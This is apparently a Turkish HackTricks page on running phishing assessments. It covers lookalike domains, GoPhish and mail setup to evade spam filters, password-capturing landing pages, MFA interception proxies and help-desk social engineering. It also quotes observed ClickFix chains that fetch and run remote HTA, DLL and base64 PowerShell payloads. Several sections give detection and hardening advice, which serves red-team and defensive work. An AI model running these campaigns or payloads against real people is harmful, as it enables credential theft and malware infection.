# Phishing Methodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Methodoloji

1. Mağduru keşfedin
1. **mağdur domainini** seçin.
2. Mağdur tarafından kullanılan **login portallarını arayarak** bazı temel web enumeration işlemleri gerçekleştirin ve hangisini **taklit edeceğinize** **karar verin**.
3. **E-posta adreslerini bulmak** için biraz **OSINT** kullanın.
2. Ortamı hazırlayın
1. Phishing değerlendirmesi için kullanacağınız **domaini satın alın**
2. **E-posta hizmetiyle** ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **yapılandırın**
3. VPS'i **gophish** ile yapılandırın
3. Kampanyayı hazırlayın
1. **E-posta şablonunu** hazırlayın
2. Kimlik bilgilerini çalacak **web sayfasını** hazırlayın
4. Kampanyayı başlatın!

## Benzer domain isimleri oluşturun veya güvenilir bir domain satın alın

### Domain Name Variation Techniques

- **Keyword**: Domain adı, orijinal domainin önemli bir **keyword**'ünü **içerir** (ör. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Bir subdomainin **noktasını tireyle** değiştirin (ör. www-zelster.com).
- **New TLD**: Aynı domaini **yeni bir TLD** kullanarak oluşturun (ör. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle** değiştirir (ör. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain adı içindeki **iki harfin yerini değiştirir** (ör. zelsetr.com).
- **Singularization/Pluralization**: Domain adının sonuna “s” ekler veya sondaki “s” harfini kaldırır (ör. zeltsers.com).
- **Omission**: Domain adındaki harflerden **birini kaldırır** (ör. zelser.com).
- **Repetition:** Domain adındaki harflerden **birini tekrarlar** (ör. zeltsser.com).
- **Replacement**: Homoglyph'e benzer ancak daha az gizlidir. Domain adındaki harflerden birini, örneğin klavyede orijinal harfin yakınındaki bir harfle değiştirir (ör. zektser.com).
- **Subdomained**: Domain adının içine bir **nokta** ekler (ör. ze.lster.com).
- **Insertion**: Domain adına bir harf **ekler** (ör. zerltser.com).
- **Missing dot**: TLD'yi domain adına ekler (ör. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Çeşitli faktörler (güneş patlamaları, kozmik ışınlar veya donanım hataları gibi) nedeniyle depolanan veya iletişim hâlindeki bazı bitlerin **otomatik olarak tersine dönme ihtimali** vardır.

Bu kavram **DNS isteklerine uygulandığında**, **DNS sunucusu tarafından alınan domainin**, başlangıçta istenen domain ile aynı olmaması mümkündür.

Örneğin, "windows.com" domaininde tek bir bitin değiştirilmesi, domaini "windnws.com" olarak değiştirebilir.

Saldırganlar, mağdurun domainine benzeyen **birden fazla bit-flipping domaini kaydederek** bundan **yararlanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup> adresini okuyun.

### Güvenilir bir domain satın alın

Kullanabileceğiniz süresi dolmuş bir domaini [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arayabilirsiniz.\
Satın alacağınız süresi dolmuş domainin **zaten iyi bir SEO'ya sahip olduğundan** emin olmak için şu kaynaklarda nasıl kategorize edildiğini kontrol edebilirsiniz:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-posta Adreslerini Keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (%100 ücretsiz)
- [https://phonebook.cz/](https://phonebook.cz) (%100 ücretsiz)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli e-posta adresi **keşfetmek** veya zaten keşfettiğiniz adresleri **doğrulamak** için mağdurun SMTP sunucularında bunlara brute-force uygulayıp uygulayamayacağınızı kontrol edebilirsiniz. [E-posta adresini nasıl doğrulayacağınızı/keşfedeceğinizi buradan öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca kullanıcılar e-postalarına erişmek için **herhangi bir web portalı kullanıyorsa**, bu portalın **username brute force** saldırısına karşı savunmasız olup olmadığını kontrol edebileceğinizi ve mümkünse bu güvenlik açığından yararlanabileceğinizi unutmayın.

## GoPhish'i Yapılandırma

### Kurulum

Bunu [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsiniz.

İndirin, `/opt/gophish` içinde decompress edin ve `/opt/gophish/gophish` dosyasını çalıştırın.\
Çıktıda, 3333 portundaki admin kullanıcısı için bir parola verilecektir. Bu nedenle ilgili porta erişin ve admin parolasını değiştirmek için bu kimlik bilgilerini kullanın. Bu portu local'e tunnel etmeniz gerekebilir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Yapılandırma

**TLS sertifikası yapılandırması**

Bu adımdan önce kullanacağınız **domain'i satın almış** olmanız ve domain'in **gophish** yapılandırmasını yaptığınız **VPS'nin IP adresini** göstermesi gerekir.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail yapılandırması**

Kuruluma başlayın: `apt-get install postfix`

Ardından domain'i aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

Ayrıca /etc/postfix/main.cf içindeki aşağıdaki değişkenlerin değerlerini değiştirin:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınızla değiştirin ve **VPS'nizi yeniden başlatın.**

Şimdi, `mail.<domain>` için VPS'nin **IP adresine** işaret eden bir **DNS A kaydı** ve `mail.<domain>` adresine işaret eden bir **DNS MX** kaydı oluşturun.

Şimdi bir e-posta göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish yapılandırması**

Gophish'in çalışmasını durdurun ve yapılandırmasını yapalım.\
`/opt/gophish/config.json` dosyasını aşağıdaki şekilde değiştirin (https kullanımına dikkat edin):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish servisini yapılandırma**

gophish servisinin otomatik olarak başlatılabilmesi ve bir servis olarak yönetilebilmesi için `/etc/init.d/gophish` dosyasını aşağıdaki içerikle oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Servisin yapılandırmasını tamamlayın ve kontrolünü şu şekilde gerçekleştirin:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail server ve domain yapılandırma

### Bekleyin ve meşru olun

Bir domain ne kadar eskiyse spam olarak yakalanma olasılığı o kadar düşüktür. Bu nedenle phishing assessment işleminden önce mümkün olduğunca uzun süre (en az 1 hafta) beklemelisiniz. Ayrıca, itibarlı bir sektör hakkında bir sayfa oluşturursanız elde edilen itibar daha iyi olacaktır.

Her ne kadar bir hafta beklemeniz gerekse de tüm yapılandırmaları şimdi tamamlayabileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydını yapılandırma

VPS'nin IP adresini domain adına çözen bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) Kaydı

**Yeni domain için bir SPF kaydı yapılandırmalısınız**. SPF kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF policy'nizi oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) kullanabilirsiniz (VPS makinesinin IP'sini kullanın).

![Phishing domain'i için SPF kaydı oluşturmaya yönelik SPF Wizard formu](<../../images/image (1037).png>)

Bu, domain içinde bir TXT kaydına ayarlanması gereken içeriktir:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Kaydı

**Yeni domain için bir DMARC kaydı yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

`_dmarc.<domain>` hostname'ini gösteren aşağıdaki içeriğe sahip yeni bir DNS TXT kaydı oluşturmalısınız:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**Yeni domain için bir DKIM yapılandırmalısınız**. DMARC record'un ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu tutorial şu kaynağa dayanmaktadır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> DKIM key'in oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Email yapılandırma puanınızı test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sayfaya erişin ve size verdikleri adrese bir email gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine e-posta göndererek ve **yanıtı okuyarak** **e-posta yapılandırmanızı kontrol edebilirsiniz** (bunun için **25** numaralı portu **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Kontrolünüzdeki bir Gmail adresine **mesaj da gönderebilir** ve Gmail gelen kutunuzdaki **e-postanın başlıklarını** kontrol edebilirsiniz; `Authentication-Results` başlık alanında `dkim=pass` bulunmalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Spamhaus Blacklist'ten Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, alan adınızın spamhaus tarafından engellenip engellenmediğini gösterebilir. Alan adınızın/IP adresinizin kaldırılmasını şu adresten talep edebilirsiniz: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist'ten Kaldırma

​​Alan adınızın/IP adresinizin kaldırılmasını [https://sender.office.com/](https://sender.office.com) adresinden talep edebilirsiniz.

## GoPhish Campaign Oluşturma ve Başlatma

### Sending Profile

- Sender profile'ı tanımlamak için bir **name** belirleyin
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Username ve password alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![GoPhish Campaign Oluşturma ve Başlatma - Sending Profile: Username ve password alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin düzgün çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Testler sırasında blacklist'e alınmanızı önlemek için test e-postalarını **10min mails addresses** adreslerine göndermenizi öneririm.

### Email Template

- Template'i tanımlamak için bir **name** belirleyin
- Ardından bir **subject** yazın (olağandışı bir şey yazmayın, normal bir e-postada okumayı bekleyebileceğiniz bir şey olsun)
- "**Add Tracking Image**" seçeneğinin işaretli olduğundan emin olun
- **Email template**'i yazın (aşağıdaki örnekte olduğu gibi değişkenleri kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
E-postanın **güvenilirliğini artırmak için**, client'tan gelen bir e-postadaki imzayı kullanmanız önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtın herhangi bir imza içerip içermediğini kontrol edin.
- info@ex.com, press@ex.com veya public@ex.com gibi **public emails** adreslerini arayın, bunlara e-posta gönderin ve yanıtı bekleyin.
- **Keşfedilmiş geçerli** bir e-posta adresiyle iletişime geçmeyi deneyin ve yanıtı bekleyin.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template ayrıca **gönderilecek dosyaların eklenmesine** olanak tanır. Özel olarak hazırlanmış bazı dosyaları/belgeleri kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **name** belirleyin
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **import** edebileceğinizi unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin
- Bir **redirection** ayarlayın

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve **sonuçları beğenene kadar** local ortamda (belki bir Apache server kullanarak) bazı testler yapmanız gerekir. Ardından bu HTML kodunu kutuya yazın.\
> HTML için bazı static kaynakları (belki bazı CSS ve JS sayfalarını) **kullanmanız** gerekiyorsa bunları _**/opt/gophish/static/endpoint**_ konumuna kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Redirection için **kullanıcıları victim'ın meşru ana web sayfasına yönlendirebilir** veya örneğin onları _/static/migration.html_ adresine yönlendirip 5 saniye boyunca bir **spinning wheel (**[**https://loading.io/**](https://loading.io)**) gösterebilir ve ardından işlemin başarılı olduğunu belirtebilirsiniz**.

### Users & Groups

- Bir name belirleyin
- **Verileri import edin** (örnekteki template'i kullanabilmek için her kullanıcının firstname, last name ve email address bilgilerine ihtiyacınız olduğunu unutmayın)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Son olarak bir name, email template, landing page, URL, sending profile ve group seçerek bir campaign oluşturun. URL'nin victim'lara gönderilecek link olacağını unutmayın.

**Sending Profile'ın, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak sağladığını** unutmayın:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Testler sırasında blacklist'e alınmaktan kaçınmak için **test e-postalarını 10min mails adreslerine göndermenizi** öneririm.

Her şey hazır olduğunda campaign'i başlatın!

## Website Cloning

Herhangi bir nedenle web sitesini clone etmek istiyorsanız aşağıdaki sayfaya bakın:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing assessment'larında (özellikle Red Teams için) **bir tür backdoor içeren dosyalar** da göndermek isteyebilirsiniz (belki bir C2 veya yalnızca bir authentication tetikleyecek bir şey).\
Bazı örnekler için aşağıdaki sayfaya göz atın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki attack oldukça zekicedir; gerçek bir web sitesini taklit eder ve kullanıcı tarafından girilen bilgileri toplarsınız. Ne yazık ki kullanıcı doğru password'ü girmediyse veya taklit ettiğiniz application 2FA ile yapılandırılmışsa, **bu bilgiler kandırılan kullanıcıyı impersonate etmenize olanak sağlamaz**.

[**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi araçlar bu noktada kullanışlıdır. Bu tool, MitM benzeri bir attack oluşturmanıza olanak tanır. Temel olarak attack şu şekilde çalışır:

1. Gerçek web sayfasının **login** formunu **impersonate** edersiniz.
2. Kullanıcı **credentials** bilgilerini fake page'inize **gönderir** ve tool bunları gerçek web sayfasına göndererek **credentials bilgilerinin çalışıp çalışmadığını kontrol eder**.
3. Account 2FA ile yapılandırılmışsa MitM page bunu ister ve **kullanıcı girdiğinde** tool bunu gerçek web sayfasına gönderir.
4. Kullanıcı authentication işleminden geçtiğinde siz (attacker olarak), tool MitM gerçekleştirirken yaptığı her interaction'a ait **credentials, 2FA, cookie ve tüm bilgileri capture etmiş** olursunuz.

### Via VNC

Victim'ı orijinaliyle aynı görünüme sahip **malicious page'e göndermek** yerine, onu **gerçek web sayfasına bağlı bir browser içeren bir VNC session'a** gönderseydiniz ne olurdu? Kullanıcının yaptıklarını görebilir, password'ü, kullanılan MFA'yı, cookie'leri ve diğer bilgileri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup> ile yapabilirsiniz.

## Detecting the detection

Busted olup olmadığınızı anlamanın en iyi yollarından biri, **domain'inizi blacklist'lerde aramaktır**. Listeleniyorsa domain'iniz bir şekilde suspicions olarak tespit edilmiştir.\
Domain'inizin herhangi bir blacklist'te görünüp görünmediğini kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) kullanmaktır.

Ancak victim'ın **wild'daki suspicions phishing activity'yi aktif olarak arayıp aramadığını** anlamanın başka yolları da vardır; bunlar aşağıda açıklanmıştır:


{{#ref}}
detecting-phising.md
{{#endref}}

Victim'ın domain'ine çok benzer bir **name'e sahip bir domain satın alabilir** ve/veya sizin kontrolünüzdeki bir domain'in **subdomain'i için**, victim'ın domain'inin **keyword'ünü içeren bir certificate oluşturabilirsiniz**. **Victim** bunlarla herhangi bir **DNS veya HTTP interaction** gerçekleştirirse, **suspicious domain'leri aktif olarak aradığını** anlayabilir ve çok stealth olmanız gerekir.<sup>[[2]](#references)</sup>

### Evaluate the phishing

E-postanızın spam folder'a düşüp düşmeyeceğini veya block edilip edilmeyeceğini ya da başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set'ler, MFA'yı aşmak için email lure'larını tamamen atlayarak **doğrudan service-desk / identity-recovery workflow'unu hedef alıyor**. Attack tamamen "living-off-the-land" yaklaşımındadır: operator geçerli credentials bilgilerine sahip olduğunda built-in admin tooling ile pivot eder; malware gerekmez.<sup>[[5]](#references)</sup>

### Attack flow
1. Victim hakkında recon yapın
* LinkedIn, data breach'leri, public GitHub vb. kaynaklardan kişisel ve corporate bilgileri toplayın.
* High-value identity'leri (executive'ler, IT, finance) belirleyin ve password / MFA reset için **tam help-desk sürecini** enumerate edin.
2. Real-time social engineering
* Target'ı impersonate ederek help-desk'i phone, Teams veya chat üzerinden arayın (genellikle **spoofed caller-ID** veya **cloned voice** kullanarak).
* Knowledge-based verification'ı geçmek için daha önce toplanan PII'ı sağlayın.
* Agent'ı **MFA secret'ını resetlemeye** veya kayıtlı bir mobile number üzerinde **SIM-swap** gerçekleştirmeye ikna edin.
3. Immediate post-access actions (gerçek vakalarda ≤60 min)
* Herhangi bir web SSO portalı üzerinden foothold oluşturun.
* Built-in'ler ile AD / AzureAD enumerate edin (binary drop edilmez):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortamda zaten whitelist edilmiş **WMI**, **PsExec** veya meşru **RMM** agent'larıyla lateral movement gerçekleştirin.

### Detection & Mitigation
* Help-desk identity recovery işlemini **privileged operation** olarak değerlendirin; step-up auth ve manager approval zorunlu olsun.
* Şu durumlarda alert üreten **Identity Threat Detection & Response (ITDR)** / **UEBA** rule'ları deploy edin:
* MFA method değişikliği + yeni device / geo'dan authentication.
* Aynı principal'ın immediate elevation'ı (user-→-admin).
* Help-desk calls'ları kaydedin ve herhangi bir reset işleminden önce **önceden kayıtlı bir number'a call-back** yapılmasını zorunlu kılın.
* **Just-In-Time (JIT) / Privileged Access** uygulayın; böylece yeni resetlenmiş account'lar high-privilege token'ları otomatik olarak devralmaz.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew'lar, high-touch operation'ların maliyetini, **search engine'leri ve ad network'lerini delivery channel'a dönüştüren mass attack'lerle** dengeler.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi fake bir sonucu search ad'lerinde en üst sıraya taşır.
2. Victim küçük bir **first-stage loader** (genellikle JS/HTA/ISO) indirir. Unit 42 tarafından gözlemlenen örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookie'lerini ve credential DB'lerini exfiltrate eder, ardından – *realtime* olarak – aşağıdakilerden hangisinin deploy edileceğine karar veren bir **silent loader** indirir:
* RAT (ör. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Yeni kayıt edilmiş domain'leri block edin ve e-mail'in yanı sıra *search-ad'ler* üzerinde de **Advanced DNS / URL Filtering** uygulayın.
* Software installation'ı signed MSI / Store package'larıyla sınırlandırın; `HTA`, `ISO`, `VBS` execution'ını policy ile deny edin.
* Browser'ların installer açan child process'lerini monitor edin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* First-stage loader'lar tarafından sıklıkla abuse edilen LOLBin'leri hunt edin (ör. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Bazı fake software portal'ları görünür download `href`'ini **gerçek GitHub/release URL'sine** yönlendirmeye devam eder; ancak JavaScript ile kullanıcının **ilk interaction'ını hijack eder** ve bunun yerine victim'ı bir **Traffic Distribution System (TDS)** chain'ine gönderir.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- Hook genellikle `document` üzerinde **capture phase** (`true`) içinde çalışır; bu nedenle site handler'larından önce tetiklenir.
- Chrome, redirect'i geçerli bir **user gesture** ile ilişkilendirmek ve popup blocker atlatmayı iyileştirmek için genellikle `click` yerine `mousedown` kullanır.
- Bazı varyantlar önceden `about:blank` açar veya `<a target="_blank">` tıklamalarını synthesize eder ve TDS URL'sini yalnızca daha sonra atar.
- Browser-side limitler genellikle `localStorage` içinde tutulur; bu nedenle **first click** malware'e ulaşabilirken refresh/retry işlemleri benign-looking görünür linke geri dönebilir.
- TDS; referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter kontrolleri, click context ve session başına sayaçlar üzerinden karar verebilir. Bu durum analyst replay'lerini non-deterministic hale getirir.

Defender ideas:
- **Displayed** `href` ile click sırasında oluşturulan **actual** navigation target'ı karşılaştırın.
- `window.open`, `about:blank` veya synthetic anchor click'leri çevresinde hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran `document.addEventListener(..., true)` handler'larını arayın.
- Aynı CloudFront/JS stage'i yükleyen, yeni register edilmiş software-download domain kümelerini yüksek sinyalli bir SEO-poisoning/TDS pattern'i olarak değerlendirin.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Bazı TDS branch'leri, kurbandan şuna benzer trusted bir Windows binary çalıştırmasını isteyen fake verification page'e (Cloudflare/IUAM style) yönlenir:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notlar:
- `mshta.exe`, URL `.7z` arşivi gibi görünse bile yanıtın **başındaki HTA/VBScript'i** çalıştırır; eklenen arşiv verisi tamamen yanıltıcı olabilir.
- Sonraki aşamalar genellikle dosya türü hakkında yalan söylemeye devam eder (`.rtf` olarak PowerShell, `.asar` olarak Python, padding uygulanmış binary'ler içeren ZIP'ler) ve ardından **manuel PE eşleme / bellek içi çalıştırma** yöntemine geçer.
- Bu zincirlerden birine müdahale ediyorsanız, **ilk başarılı çalıştırmadan itibaren ağ + belleği** koruyun: sonraki tekrar çalıştırmalar yalnızca zararsız bir installer/SFX yolu gösterebilir veya payload/key release orijinal TDS oturumuna bağlandığı için başarısız olabilir.

### ClickFix DLL dağıtım taktikleri (sahte CERT güncellemesi)
* Yem: **Güncelle** düğmesiyle adım adım “düzeltme” talimatları gösteren, klonlanmış ulusal CERT duyurusu. Kurbanlara bir DLL indiren ve bunu `rundll32` ile çalıştıran bir batch çalıştırmaları söylenir.<sup>[[8]](#references)</sup>
* Gözlemlenen tipik batch zinciri:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`, payload'ı `%TEMP%` konumuna bırakır; kısa bir bekleme network jitter'ını gizler, ardından `rundll32` dışa aktarılan entrypoint'i (`notepad`) çağırır.
* DLL, host kimliğini beacon olarak gönderir ve birkaç dakikada bir C2'yi sorgular. Remote tasking, gizli ve policy bypass ile çalıştırılan **base64-encoded PowerShell** olarak gelir:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Bu yöntem C2 esnekliğini korur (server, DLL'yi güncellemeden task'leri değiştirebilir) ve console window'larını gizler. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` ifadelerini birlikte kullanan `rundll32.exe` child process'lerini arayın.
* Defenders, DLL load sonrasında `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'lerini ve 5 dakikalık polling aralıklarını inceleyebilir.

---

## AI ile Güçlendirilmiş Phishing Operasyonları
Attackers artık tamamen kişiselleştirilmiş lure'lar ve gerçek zamanlı etkileşim için **LLM ve voice-clone API'lerini** zincirliyor.

| Katman | Threat actor tarafından örnek kullanım |
|-------|-------------|
